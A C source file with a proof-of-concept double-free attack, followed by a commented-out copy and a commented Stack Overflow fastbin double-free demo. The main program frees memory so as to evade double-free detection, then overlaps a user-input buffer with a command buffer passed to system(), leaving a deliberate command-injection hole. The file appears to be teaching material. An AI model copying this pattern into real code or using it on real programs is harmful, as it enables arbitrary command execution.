#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Based on: https://github.com/B1TC0R3/double_free_vulnerability_poc

int main() {
    char* a = malloc(50);
    char* b = malloc(50);

    puts("Initial pointer addresses:");
    printf("a :: %p\n", a);
    printf("b :: %p\n", b);
    puts("");

    free(a);

    //Circumvent double free detection by the kernel
    free(b);
    strncpy(a, "text", 50);
    free(a);

    char* command = malloc(50);
    char* some_pointer = malloc(50);
    char* username = malloc(50);

    puts("New pointer addresses:");
    printf("command  :: %p\n", command);
    printf("username :: %p\n", username);
    puts("===============\n"
         "From here on, the application would run the same way\n"
         "as it might look for a normal user\n"
         "===============\n");

    strncpy(command, "date", 50);

    printf("Enter your username: ");
    scanf("%512[^\n]", username);

    printf("\nHello %s, this is the current date:\n", username);
    system(command);

    free(command); //Freeing 'username' would lead to yet another double free.
    free(some_pointer);

    return 0;
}


//#include <stdlib.h>
//#include <string.h>
//#include <stdio.h>

// Based on: https://github.com/B1TC0R3/double_free_vulnerability_poc

// int main() {
//     char* a = malloc(50);
//     char* b = malloc(50);

//     puts("Initial pointer addresses:");
//     printf("a :: %p\n", a);
//     printf("b :: %p\n", b);
//     puts("");

//     free(a);

//     //Circumvent double free detection by the kernel
//     free(b);
//     strncpy(a, "text", 50);
//     free(a);

//     char* command = malloc(50);
//     char* some_pointer = malloc(50);
//     char* username = malloc(50);

//     puts("New pointer addresses:");
//     printf("command  :: %p\n", command);
//     printf("username :: %p\n", username);
//     puts("===============\n"
//          "From here on, the application would run the same way\n"
//          "as it might look for a normal user\n"
//          "===============\n");

//     strncpy(command, "date", 50);

//     printf("Enter your username: ");
//     scanf("%512[^\n]", username);

//     printf("\nHello %s, this is the current date:\n", username);
//     system(command);

//     free(command); //Freeing 'username' would lead to yet another double free.
//     free(some_pointer);

//     return 0;
// }


// Source: https://stackoverflow.com/questions/36406041/understanding-of-double-free-attack

// #include <stdio.h>
// #include <stdlib.h>

// int main()
// {
//     printf("This file demonstrates a simple double-free attack with fastbins.\n");

//     printf("Allocating 3 buffers.\n");
//     int *a = malloc(8);
//     int *b = malloc(8);
//     int *c = malloc(8);

//     printf("1st malloc(8): %p\n", a);
//     printf("2nd malloc(8): %p\n", b);
//     printf("3rd malloc(8): %p\n", c);

//     printf("Freeing the first one...\n");
//     free(a);

//     printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
//     // free(a);

//     printf("So, instead, we'll free %p.\n", b);
//     free(b);

//     printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
//     free(a);

//     printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
//     printf("1st malloc(8): %p\n", malloc(8));
//     printf("2nd malloc(8): %p\n", malloc(8));
//     printf("3rd malloc(8): %p\n", malloc(8));
// }
